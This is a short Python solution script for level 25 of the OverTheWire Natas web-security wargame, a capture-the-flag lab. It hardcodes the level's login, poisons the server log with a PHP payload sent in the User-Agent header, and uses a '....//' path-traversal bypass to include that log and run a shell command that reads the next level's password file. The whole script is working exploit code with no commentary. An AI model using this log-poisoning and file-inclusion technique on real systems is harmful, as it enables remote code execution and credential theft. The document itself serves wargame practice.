#!/usr/bin/env python3

import requests
import re


req = requests.Session()


username = "natas25"
password = "GHF6X7YwACaYYssHVY05cFq83hRktl4c"
url = "http://%s.natas.labs.overthewire.org/" % username

headers = {'User-Agent': '<?php	echo(system("cat /etc/natas_webpass/natas26")); ?>'}

req_get = req.get(url,auth=(username,password),headers=headers)
req_get = req.get(url+"?lang=....//....//....//....//....///var/www/natas/natas25/logs/natas25_"+req.cookies['PHPSESSID']+".log",auth=(username,password),headers=headers)

new_password = re.findall("] (.*)\n",req_get.text)
print(new_password[0])
